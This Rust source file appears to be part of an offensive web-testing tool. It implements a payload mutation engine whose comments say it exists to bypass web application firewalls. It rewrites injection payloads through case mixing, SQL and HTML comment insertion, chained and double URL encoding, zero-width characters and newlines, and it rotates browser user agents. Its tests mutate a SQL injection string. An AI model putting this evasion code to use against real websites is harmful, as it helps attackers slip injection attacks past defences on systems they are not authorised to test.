//! Adaptive payload mutation engine.
//! Static payloads = fingerprint = WAF bypass in <1min.
//! Mutate payloads: comments, encoding, case-mix, zero-width, unicode.

use rand::{rngs::StdRng, Rng, SeedableRng};

pub fn random_ua() -> &'static str {
    const UAS: &[&str] = &[
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0",
    ];
    let mut rng = rand::thread_rng();
    UAS[rng.gen_range(0..UAS.len())]
}

pub fn mutate(payload: &str, n: usize, seed: u64) -> Vec<String> {
    let mut rng = StdRng::seed_from_u64(seed);
    let mut out: Vec<String> = Vec::with_capacity(n);
    out.push(payload.to_string());
    let strategies: &[fn(&str, &mut StdRng) -> String] = &[
        case_mix, insert_comments_sql, insert_comments_html,
        url_encode_chain, |s, _r| prepend_unicode_zwsp(s),
        insert_newlines, double_encode, swap_case,
    ];
    for _ in 1..n {
        let f = strategies[rng.gen_range(0..strategies.len())];
        let m = f(payload, &mut rng);
        if !out.contains(&m) {
            out.push(m);
        }
        if out.len() >= n {
            break;
        }
    }
    if out.len() < n {
        // pad with originals if strategies collapsed (small payload + dedup)
        let mut i = 0;
        while out.len() < n {
            out.push(format!("{}{}", payload, i));
            i += 1;
        }
    }
    out.truncate(n);
    out
}

fn case_mix(s: &str, rng: &mut StdRng) -> String {
    s.chars()
        .map(|c| if rng.gen_bool(0.5) && c.is_ascii_alphabetic() { c.to_ascii_uppercase() } else { c })
        .collect()
}

fn swap_case(s: &str, rng: &mut StdRng) -> String {
    s.chars()
        .map(|c| {
            if !c.is_ascii_alphabetic() { return c; }
            if rng.gen_bool(0.5) { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }
        })
        .collect()
}

fn insert_comments_sql(s: &str, rng: &mut StdRng) -> String {
    let comments = ["/**/", "/*!*/", "-- ", "# "];
    let c = comments[rng.gen_range(0..comments.len())];
    if s.is_empty() { return s.to_string(); }
    let pos = rng.gen_range(0..s.len());
    let (a, b) = s.split_at(pos);
    format!("{}{}{}", a, c, b)
}

fn insert_comments_html(s: &str, rng: &mut StdRng) -> String {
    let comments = ["<!--", "-->", "/*", "*/"];
    let c = comments[rng.gen_range(0..comments.len())];
    if s.is_empty() { return s.to_string(); }
    let pos = rng.gen_range(0..s.len());
    let (a, b) = s.split_at(pos);
    format!("{}{}{}", a, c, b)
}

fn url_encode_chain(s: &str, rng: &mut StdRng) -> String {
    let mut out = s.to_string();
    let rounds = rng.gen_range(1..=3);
    for _ in 0..rounds {
        if out.is_empty() { break; }
        let pos = rng.gen_range(0..out.len());
        let c = out[pos..].chars().next().unwrap_or('a');
        let encoded = format!("%{:02X}", c as u32);
        out = format!("{}{}{}", &out[..pos], encoded, &out[pos + c.len_utf8()..]);
    }
    out
}

fn prepend_unicode_zwsp(s: &str) -> String {
    format!("\u{200B}{}", s)
}

fn insert_newlines(s: &str, rng: &mut StdRng) -> String {
    if s.is_empty() { return s.to_string(); }
    let pos = rng.gen_range(0..s.len());
    let (a, b) = s.split_at(pos);
    format!("{}\n{}", a, b)
}

fn double_encode(s: &str, _rng: &mut StdRng) -> String {
    s.replace("%", "%25").replace(" ", "%2520")
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn mutate_n_variants() {
        let v = mutate("' OR 1=1--", 10, 42);
        assert_eq!(v.len(), 10);
        assert_eq!(v[0], "' OR 1=1--");
    }
    #[test]
    fn ua_one() { let _ = random_ua(); }
    #[test]
    fn case_mix_len() {
        let m = case_mix("a1B2", &mut StdRng::seed_from_u64(1));
        assert_eq!(m.len(), 4);
    }
}
